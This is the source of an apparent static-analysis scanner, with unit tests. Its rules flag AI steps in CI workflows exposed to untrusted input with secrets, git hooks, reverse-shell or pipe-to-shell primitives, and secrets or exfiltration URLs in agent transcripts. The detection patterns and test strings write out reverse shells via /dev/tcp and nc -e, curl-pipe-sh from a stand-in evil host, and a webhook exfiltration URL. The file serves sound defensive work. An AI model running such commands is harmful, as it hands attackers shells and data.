-- Agent / hook / shell primitives (v1 subset).

use finding { Finding, Severity, make_finding, has_skip, concat_findings }
use lacan_shim {
    re_find_line, re_is_match, str_contains, str_starts_with, path_basename, str_ends_with, str_to_lower, path_extension,
    split_lines, gha_step_item_line, read_text
}

-- AIS002 helpers. Crisp string interpolation forbids `{` in double-quoted
-- literals, so untrusted github.event.* is matched with str_contains (no braces).

is_workflow_path(path) = {
    ext := str_to_lower(path_extension(path))
    (str_contains(path, "/.github/workflows/") || str_contains(path, "/workflows/")) && (ext == "yml" || ext == "yaml")
}

has_write_or_secret(chunk) = {
    str_contains(chunk, "secrets.") || re_is_match("(?i)(contents|pull-requests|issues|id-token|packages|deployments|actions|security-events)\\s*:\\s*write", chunk)
}

step_has_untrusted(chunk) = {
    str_contains(chunk, "github.head_ref") || str_contains(chunk, "github.event.issue.") || str_contains(chunk, "github.event.pull_request.") || str_contains(chunk, "github.event.comment.") || str_contains(chunk, "github.event.review.") || str_contains(chunk, "github.event.discussion.") || str_contains(chunk, "github.event.workflow_run.")
}

step_has_ai(chunk) = {
    re_is_match("(?i)uses:\\s*\\S*(openai|anthropic|chatgpt|continue|aider|cursor-agent|huggingface|bedrock|gemini|ollama|langchain|litellm|auto-gpt|smolagents)", chunk) || re_is_match("(?i)run:\\s*.*\\b(openai|anthropic|chatgpt|litellm|ollama|langchain)\\b", chunk)
}

ais002_ai_re() = "(?i)uses:\\s*\\S*(openai|anthropic|chatgpt|continue|aider|cursor-agent|huggingface|bedrock|gemini|ollama|langchain|litellm|auto-gpt|smolagents)"

is_gha_job_key(line) = {
    if !re_is_match("^  [A-Za-z0-9][A-Za-z0-9_-]*:\\s*$", line) {
        false
    } else {
        !re_is_match("^  (permissions|defaults|concurrency|env|runs-on|steps|needs|if|timeout-minutes|strategy|container|services|outputs|continue-on-error|environment):\\s*$", line)
    }
}

is_gha_step_item(line) = {
    gha_step_item_line(line)
}

-- Absolute 1-based AI line when same step has untrusted + AI and job/workflow has write/secrets.
ais002_line(path, text) -> int = {
    if !is_workflow_path(path) {
        0
    } else {
        lines := split_lines(text)
        header mut:= ""
        in_jobs mut:= false
        workflow_write mut:= false
        job_write mut:= false
        step mut:= ""
        step_start mut:= 0
        hit mut:= 0
        i mut:= 0
        while i < len(lines) && hit == 0 {
            line := lines[i]
            lineno := i + 1
            if !in_jobs {
                -- Match "jobs:" with optional trailing comment/content (Rust used trim_end + starts_with).
                if str_starts_with(line, "jobs:") {
                    workflow_write = has_write_or_secret(header)
                    in_jobs = true
                } else {
                    header = header ++ line ++ "\n"
                }
            } else {
                if is_gha_job_key(line) {
                    if step_start > 0 {
                        hit = ais002_step_hit(step, step_start, job_write || workflow_write)
                    }
                    job_write = false
                    step = ""
                    step_start = 0
                }
                if hit == 0 {
                    if is_gha_step_item(line) {
                        if step_start > 0 {
                            hit = ais002_step_hit(step, step_start, job_write || workflow_write)
                        }
                        if hit == 0 {
                            step = line ++ "\n"
                            step_start = lineno
                        }
                    } else {
                        if step_start > 0 {
                            step = step ++ line ++ "\n"
                        }
                        if has_write_or_secret(line) {
                            job_write = true
                        }
                    }
                }
            }
            i = i + 1
        }
        if hit == 0 && step_start > 0 {
            hit = ais002_step_hit(step, step_start, job_write || workflow_write)
        }
        hit
    }
}

ais002_step_hit(step, step_start, elevated) -> int = {
    if !elevated {
        0
    } else {
        if !(step_has_untrusted(step) && step_has_ai(step)) {
            0
        } else {
            local mut:= re_find_line(ais002_ai_re(), step)
            if local == 0 {
                local = re_find_line("(?i)run:\\s*.*\\b(openai|anthropic|chatgpt|litellm|ollama|langchain)\\b", step)
            }
            if local > 0 {
                step_start + local - 1
            } else {
                step_start
            }
        }
    }
}

-- v7.1 experimental: untrusted CI input → AI step → secrets/write in one job (Crisp).
pub ais002(path, text) -> vec<Finding> = {
    out := new()
    if has_skip(text, "AIS002") {
        out
    } else {
        line := ais002_line(path, text)
        if line > 0 {
            push(out, make_finding(
                "AIS002",
                Severity.Critical,
                "2.1",
                "AML.T0010.000",
                path,
                line,
                "Untrusted CI input reaches an AI step in a job with secrets or write permissions (experimental)"
            ))
        }
        out
    }
}

pub ais001(path, text) -> vec<Finding> = {
    out := new()
    if has_skip(text, "AIS001") {
        out
    } else {
        -- Match real .git/hooks and fixture path .../dot-git/hooks/ (git cannot track nested .git).
        if str_contains(path, "/.git/hooks/") || str_contains(path, "/dot-git/hooks/") {
            base := path_basename(path)
            if !str_ends_with(base, ".sample") {
                push(out, make_finding(
                    "AIS001",
                    Severity.High,
                    "2.1",
                    "AML.T0010.000",
                    path,
                    1,
                    "Git hook file present: " ++ base
                ))
            }
        }
        if str_contains(path, ".git/config") || str_contains(path, "/dot-git/config") {
            line := re_find_line("(?i)hooksPath\\s*=", text)
            if line > 0 {
                push(out, make_finding(
                    "AIS001",
                    Severity.High,
                    "2.1",
                    "AML.T0010.000",
                    path,
                    line,
                    "core.hooksPath is set in .git/config"
                ))
            }
        }
        out
    }
}

pub ais008(path, text) -> vec<Finding> = {
    out := new()
    if has_skip(text, "AIS008") {
        out
    } else {
        patterns := new()
        push(patterns, "/dev/tcp/")
        push(patterns, "nc -e")
        push(patterns, "ncat -e")
        push(patterns, "curl[^\\n]*\\|\\s*(ba)?sh")
        push(patterns, "wget[^\\n]*\\|\\s*(ba)?sh")
        i mut:= 0
        while i < len(patterns) {
            pat := patterns[i]
            line := re_find_line(pat, text)
            if line > 0 {
                push(out, make_finding(
                    "AIS008",
                    Severity.High,
                    "2.1",
                    "AML.T0010.000",
                    path,
                    line,
                    "Reverse-shell or pipe-to-shell primitive matched"
                ))
            }
            i = i + 1
        }
        out
    }
}

pub ais401(path, text) -> vec<Finding> = {
    out := new()
    if has_skip(text, "AIS401") {
        out
    } else {
        ext := str_to_lower(path_extension(path))
        is_transcript := ext == "jsonl" || str_contains(path, "/transcripts/") || str_contains(path, "/sessions/")
        if is_transcript {
            patterns := new()
            push(patterns, "(?i)(api[_-]?key|secret[_-]?key|password)\\s*[:=]\\s*\\S+")
            push(patterns, "sk-[A-Za-z0-9]{10,}")
            push(patterns, "AKIA[0-9A-Z]{16}")
            push(patterns, "(?i)https?://[^\\s]+(webhook|exfil|pastebin|requestbin)")
            i mut:= 0
            while i < len(patterns) {
                pat := patterns[i]
                line := re_find_line(pat, text)
                if line > 0 {
                    push(out, make_finding(
                        "AIS401",
                        Severity.High,
                        "2.3",
                        "AML.T0010.003",
                        path,
                        line,
                        "Agent transcript JSONL may contain secrets or exfiltration URLs"
                    ))
                }
                i = i + 1
            }
        }
        out
    }
}

pub scan_agent(path, text) -> vec<Finding> = {
    acc := concat_findings(ais001(path, text), ais002(path, text))
    acc = concat_findings(acc, ais008(path, text))
    concat_findings(acc, ais401(path, text))
}

test "ais002 three hop chain" = {
    text := read_text("../../fixtures/AIS002/fail/workflows/chain.yml", 100000)
    fs := ais002(".github/workflows/chain.yml", text)
    assert_eq(len(fs) > 0, true)
    assert_eq(fs[0].id, "AIS002")
}

test "ais002 without write is clean" = {
    text := read_text("../../fixtures/AIS002/pass/workflows/ai-read-only.yml", 100000)
    fs := ais002(".github/workflows/ai-read-only.yml", text)
    assert_eq(len(fs), 0)
}

test "ais002 without ai is clean" = {
    text := read_text("../../fixtures/AIS002/pass/workflows/echo-only.yml", 100000)
    fs := ais002(".github/workflows/echo-only.yml", text)
    assert_eq(len(fs), 0)
}

test "ais002 cross job is clean" = {
    text := read_text("../../fixtures/AIS002/pass/workflows/split-jobs.yml", 100000)
    fs := ais002(".github/workflows/split-jobs.yml", text)
    assert_eq(len(fs), 0)
}

test "ais008 matches curl pipe sh" = {
    fs := ais008("scripts/setup.sh", "curl https://evil.example/x | sh\n")
    assert_eq(len(fs) > 0, true)
    assert_eq(fs[0].id, "AIS008")
}

test "ais008 matches wget pipe bash" = {
    fs := ais008("scripts/setup.sh", "wget -qO- https://evil.example/x | bash\n")
    assert_eq(len(fs) > 0, true)
}

test "ais008 matches nc -e" = {
    fs := ais008("rev.sh", "nc -e /bin/sh 1.2.3.4 4444\n")
    assert_eq(len(fs) > 0, true)
}

test "ais008 clean script" = {
    fs := ais008("scripts/setup.sh", "#!/bin/sh\necho ok\n")
    assert_eq(len(fs), 0)
}

test "ais008 respects skip" = {
    fs := ais008("scripts/setup.sh", "# lacan:skip=AIS008:intentional\ncurl https://evil.example/x | sh\n")
    assert_eq(len(fs), 0)
}

test "ais001 git hook path" = {
    fs := ais001("repo/dot-git/hooks/pre-commit", "#!/bin/sh\necho hook\n")
    assert_eq(len(fs) > 0, true)
    assert_eq(fs[0].id, "AIS001")
}

test "ais001 ignores sample hooks" = {
    fs := ais001("repo/dot-git/hooks/pre-commit.sample", "#!/bin/sh\n")
    assert_eq(len(fs), 0)
}

test "ais001 hooksPath in config" = {
    fs := ais001("repo/dot-git/config", "[core]\n\thooksPath = /tmp/hooks\n")
    assert_eq(len(fs) > 0, true)
}

test "scan_agent combines rules" = {
    fs := scan_agent("scripts/x.sh", "curl https://evil.example/x | sh\n")
    assert_eq(len(fs) > 0, true)
}

test "ais008 matches /dev/tcp" = {
    fs := ais008("rev.sh", "bash -i >& /dev/tcp/1.2.3.4/44 0>&1\n")
    assert_eq(len(fs) > 0, true)
}

test "ais001 skip on hook" = {
    fs := ais001("repo/dot-git/hooks/pre-commit", "# lacan:skip=AIS001:fixture\n#!/bin/sh\n")
    assert_eq(len(fs), 0)
}

test "ais401 secret in jsonl" = {
    fs := ais401(
        "logs/transcripts/run.jsonl",
        "assistant noted api_key=sk-live-abcdefghijklmnop in the log\n"
    )
    assert_eq(len(fs) > 0, true)
    assert_eq(fs[0].id, "AIS401")
}

test "ais401 exfil url" = {
    fs := ais401(
        "agent/sessions/thread.jsonl",
        "POST results to https://evil.example/webhook/collect\n"
    )
    assert_eq(len(fs) > 0, true)
}

test "ais401 clean jsonl" = {
    fs := ais401("logs/transcripts/run.jsonl", "user asked a harmless question\n")
    assert_eq(len(fs), 0)
}
